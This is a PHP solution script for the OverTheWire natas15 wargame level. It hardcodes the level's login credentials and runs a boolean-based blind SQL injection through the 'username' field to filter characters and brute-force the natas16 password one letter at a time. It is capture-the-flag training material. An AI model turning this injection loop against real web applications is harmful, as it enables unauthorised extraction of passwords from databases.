<?php

$authorization = base64_encode("natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB");
$url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
$valid = "This user exists.";

function verify($inyection)
{
    global $authorization;
    global $url;
    global $valid;

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n" .
                "Authorization: Basic $authorization\r\n",
            'method' => 'POST',
            'content' => http_build_query(['username' => $inyection]),
        ],
    ];

    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    return str_contains($response, $valid);
}

function contains_inyection($substring)
{
    return "natas16\" AND password LIKE BINARY \"%$substring%";
}

function startwith_inyection($start)
{
    return "natas16\" AND password LIKE BINARY \"$start%";
}


function equals_inyection($password)
{
    return "natas16\" AND password LIKE BINARY \"$password";
}


$alphabet = array_merge(range('A', 'Z'), range('a', 'z'), range(0, 9));
$filtered = array();

echo "Filtering characters...\n\n";

foreach ($alphabet as $letter) {
    echo "- Checking $letter.";
    if (verify(contains_inyection($letter))) {
        echo " Contained!\n";
        $filtered[] = $letter;
    } else {
        echo "\n";
    }
}

echo "\nFiltered characters: " . join("", $filtered) . "\n";

echo "Bruteforcing password...\n\n";

$password = "";
while (!verify(equals_inyection($password))) {
    echo "Current password: $password\n";
    foreach ($filtered as $letter) {
        echo "- Checking $password$letter";
        if (verify(startwith_inyection($password . $letter))) {
            echo " - Correct!\n";
            $password .= $letter;
            break;
        } else {
            echo "\n";
        }
    }
}

echo "\nFinal password: $password\n";
